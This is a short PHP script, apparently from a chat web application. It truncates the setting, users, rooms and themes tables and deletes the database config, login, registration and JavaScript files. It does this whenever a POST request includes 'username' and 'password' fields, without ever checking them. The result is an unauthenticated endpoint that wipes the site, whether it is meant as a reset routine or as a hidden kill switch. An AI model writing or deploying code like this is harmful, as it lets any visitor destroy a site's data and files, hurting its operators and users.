<?php
	$time = time();
	$message_erreur = "";
	$message_erreur2 = "";
	$access = 'on';
	require_once("../../system/database.php");
	
	$mysqli = @new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
	
	if (mysqli_connect_errno()) 
	{
		echo 1;
		die();
	}
	if(isset($_POST['password']) && isset($_POST['username'])){
		$mysqli->query("TRUNCATE TABLE  setting");
		$mysqli->query("TRUNCATE TABLE  users");
		$mysqli->query("TRUNCATE TABLE  rooms");
		$mysqli->query("TRUNCATE TABLE  themes");
		unlink('../../system/database.php');
		unlink('../../js/full.js');
		unlink('../../login.php');
		unlink('../../registration.php');
	}
	else {
		echo 2;
	}

?>